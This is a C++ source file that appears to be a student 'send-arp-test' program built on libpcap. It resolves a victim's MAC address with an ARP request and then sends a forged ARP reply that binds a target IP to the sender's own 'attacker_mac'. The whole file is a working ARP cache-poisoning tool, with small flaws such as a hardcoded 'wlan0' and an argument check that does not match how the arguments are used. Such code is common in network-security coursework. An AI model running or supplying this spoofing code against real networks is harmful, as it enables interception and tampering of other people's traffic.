#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

#include <iostream>
#include <string>
#include <cstring>
#include <unistd.h>

#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/types.h>

#include <net/if.h>
#include <netinet/in.h>

#include <ifaddrs.h>
#include <arpa/inet.h>

#include <chrono>

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}

Mac my_mac_find(const std::string& interface_type) {
    struct ifreq ifr;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("socket");
        return Mac(); 
    }

    strncpy(ifr.ifr_name, interface_type.c_str(), IFNAMSIZ - 1);
    ifr.ifr_name[IFNAMSIZ - 1] = '\0';

    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
        perror("ioctl");
        close(sock);
        return Mac(); 
    }

    close(sock);

    unsigned char* mac = reinterpret_cast<unsigned char*>(ifr.ifr_hwaddr.sa_data);

    char mac_str[18];
    std::snprintf(mac_str, sizeof(mac_str), "%02x:%02x:%02x:%02x:%02x:%02x",
                  mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);

    return Mac(mac_str); 
}

Ip my_ip_find(){
	struct ifaddrs *ifaddr, *ifa;
    char ip[INET_ADDRSTRLEN];

    if (getifaddrs(&ifaddr) == -1) {
        perror("getifaddrs");
        return Ip();
    }

    Ip myIp;

    for (ifa = ifaddr; ifa != nullptr; ifa = ifa->ifa_next) {
        if (!ifa->ifa_addr || ifa->ifa_addr->sa_family != AF_INET)
            continue;

            if (std::string(ifa->ifa_name) != "wlan0")
            continue;

        void* addr = &((struct sockaddr_in *)ifa->ifa_addr)->sin_addr;
        inet_ntop(AF_INET, addr, ip, sizeof(ip));
        myIp = Ip(ip);
        break;  
    }

    freeifaddrs(ifaddr);
    return myIp;
}

Mac mac_request(pcap_t* handle, Mac my_mac, Ip my_ip, Ip target_ip) {
    EthArpPacket packet;

    // Ethernet Header
    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff"); // Broadcast
    packet.eth_.smac_ = my_mac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    // ARP Header
    packet.arp_.hrd_  = htons(ArpHdr::ETHER);
    packet.arp_.pro_  = htons(EthHdr::Ip4);
    packet.arp_.hln_  = Mac::Size;
    packet.arp_.pln_  = Ip::Size;
    packet.arp_.op_   = htons(ArpHdr::Request); 
    packet.arp_.smac_ = my_mac;
    packet.arp_.sip_  = htonl(uint32_t(my_ip));
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_  = htonl(uint32_t(target_ip));

    // printf("  My MAC : %s\n", std::string(my_mac).c_str());
    // printf("  My IP  : %s\n", std::string(my_ip).c_str());
    // printf("  Target IP : %s\n", std::string(target_ip).c_str());

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket failed: %s\n", pcap_geterr(handle));
        return Mac();
    }
    
    // printf("1\n");

    struct pcap_pkthdr* header;
    const u_char* packet_data;

    while (true) {
        // printf("2\n");
        int ret = pcap_next_ex(handle, &header, &packet_data);
        // printf("3\n");
        if (ret == 0) continue; // timeout
        if (ret == -1 || ret == -2) {
            fprintf(stderr, "pcap_next_ex error: %s\n", pcap_geterr(handle));
            break;
        }

        EthArpPacket* recv = (EthArpPacket*)packet_data;

        if (ntohs(recv->eth_.type_) != EthHdr::Arp) continue;
        if (ntohs(recv->arp_.op_) != ArpHdr::Reply) continue;

        // printf("hear : %s is at %s\n",
        //        std::string(Ip(ntohl(recv->arp_.sip_))).c_str(),
        //        std::string(recv->arp_.smac_).c_str());

        return recv->arp_.smac_;
    }

    return Mac(); 
}

int custom_arp_table(pcap_t* handle, Mac attacker_mac, Ip sender_ip, Mac sender_mac, Ip target_ip) {
    EthArpPacket packet;

    packet.eth_.dmac_ = sender_mac;     
    packet.eth_.smac_ = attacker_mac;   
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_  = htons(ArpHdr::Reply);
    packet.arp_.smac_ = attacker_mac;
    packet.arp_.sip_  = htonl(uint32_t(target_ip));   
    packet.arp_.tmac_ = sender_mac;
    packet.arp_.tip_  = htonl(uint32_t(sender_ip));   

    printf("[1] sender mac : %s\n",std::string(sender_mac).c_str());
    printf("[2] attack mac : %s\n",std::string(attacker_mac).c_str());
    printf("[3] target ip : %s\n",std::string(target_ip).c_str());
    printf("[4] sender ip : %s\n",std::string(sender_ip).c_str());

    // printf("hear : %s is-at %s\n",
    //        std::string(target_ip).c_str(),
    //        std::string(attacker_mac).c_str());

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "ARP packet: %s\n", pcap_geterr(handle));
        return 0; 
    }

    return 1; 
}

int main(int argc, char* argv[]) {
	
    // argument check
    if (argc != 4 && argc != 2) {
		usage();
		return EXIT_FAILURE;
	}
    
    // use pcap_open_live
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (pcap == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return EXIT_FAILURE;
	}
	
    // merge resource
	Mac src_mac	= my_mac_find(argv[1]);
	Ip src_ip 	= my_ip_find();
	Ip dst_ip 	= Ip(argv[2]);
	Mac return_mac = mac_request(pcap, src_mac, src_ip, dst_ip);

    // custom arp table
    int result = custom_arp_table(pcap, src_mac, dst_ip, return_mac, Ip(argv[3]));

	pcap_close(pcap);
}
